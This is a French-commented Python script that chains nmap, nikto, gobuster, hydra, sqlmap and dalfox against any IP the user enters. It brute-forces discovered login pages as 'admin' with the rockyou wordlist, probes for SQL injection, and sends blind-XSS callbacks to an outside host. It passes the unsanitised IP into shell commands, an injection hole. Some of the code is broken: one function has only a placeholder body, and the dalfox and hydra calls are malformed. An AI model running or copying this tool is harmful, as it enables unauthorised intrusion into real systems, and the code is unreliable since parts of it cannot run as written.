#!/usr/bin/env python3
import subprocess
import webbrowser
import os

def run_tool(command, output_file):
    """Exécute une commande et enregistre la sortie dans un fichier."""
    with open(output_file, "w") as f:
        subprocess.run(command, shell=True, stdout=f, stderr=f)

def check_and_install_tool(tool_name, install_command):
    """Vérifie si un outil est installé et l'installe si nécessaire."""
    try:
        subprocess.run([tool_name, "--version"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except FileNotFoundError:
        print(f"{tool_name} non trouvé. Installation en cours...")
        subprocess.run(install_command, shell=True)

def scan_web_directory(ip, tool="gobuster"):
    """Scanne les répertoires web et enregistre les résultats."""
    output_file = f"web_scan_{ip}.txt"
    command = f"{tool} dir -u http://{ip} -w /usr/share/wordlists/dirb/common.txt -o {output_file}"
    run_tool(command, output_file)
    return output_file

def bruteforce_login(ip, login_page, tool="hydra"):
    """Effectue une attaque par brute-force sur une page de login."""
    output_file = f"bruteforce_{ip}_{login_page}.txt"
    # Utilisation de l'option -f pour arrêter à la première identification réussie
    command = f"{tool} -l admin -P /usr/share/wordlists/rockyou.txt {ip} http-post-form '{login_page}' user=^USER^&pass=^PASS^&login=Login -f"
    run_tool(command, output_file)
    return output_file

def test_sql_injection(ip, tool="sqlmap"):
    """Teste les vulnérabilités d'injection SQL."""
    output_file = f"sql_injection_{ip}.txt"
    # Utilisation du niveau de risque 1 pour les tests initiaux
    command = f"{tool} -u http://{ip}/ --forms --batch --level=1"
    run_tool(command, output_file)
    return output_file

def test_xss(ip, tool="dalfox"):
    """Teste les vulnérabilités XSS."""
    output_file = f"xss_{ip}.txt"
    command = f"{tool} file {output_file} -b hahwul.xss.ht pipe"
    run_tool(command, output_file)
    return output_file

def generate_report(ip, results):
    """Génère un rapport HTML simple avec les résultats."""
    # ... (même code que précédemment)

# Vérification et installation des outils
tools_to_check = {
    "nmap": "sudo apt install -y nmap",
    "nikto": "sudo apt install -y nikto",
    "gobuster": "sudo apt install -y gobuster",
    "hydra": "sudo apt install -y hydra",
    "sqlmap": "sudo apt install -y sqlmap",
    "dalfox": "sudo go install github.com/hahwul/dalfox/v2@latest"
}
for tool, install_command in tools_to_check.items():
    check_and_install_tool(tool, install_command)

# Saisie de l'IP cible
ip = input("Entrez l'IP cible : ")

# Outils à exécuter (ajoutez ou supprimez selon vos besoins)
tools = {
    "Nmap (scan de ports)" : f"nmap -A -T4 {ip}",
    "Nikto (scanner de vulnérabilités web)" : f"nikto -h http://{ip}", 
    # Nessus nécessite une configuration spécifique, il est commenté ici
    # "Nessus (scan de vulnérabilités approfondi)" : f"nessus -q {ip}",  
}

# Exécution des outils et enregistrement des résultats
results = {}
for tool, command in tools.items():
    output_file = f"{tool.replace(' ', '_')}_{ip}.txt"
    run_tool(command, output_file)
    results[tool] = output_file

# Scan de répertoires web
web_scan_file = scan_web_directory(ip)
results["Scan de répertoires web"] = web_scan_file

# Brute-force sur les pages de login (si trouvées)
with open(web_scan_file, "r") as f:
    for line in f:
        if "login.php" in line or "/wp-login.php" in line: 
            bruteforce_file = bruteforce_login(ip, line.strip())  # Correction pour utiliser le chemin complet
            results[f"Brute-force sur {line.strip()}"] = bruteforce_file


# Tests d'injection SQL et XSS
sql_injection_file = test_sql_injection(ip)
results["Test d'injection SQL"] = sql_injection_file

xss_file = test_xss(ip)
results["Test XSS"] = xss_file

# Génération du rapport
generate_report(ip, results)
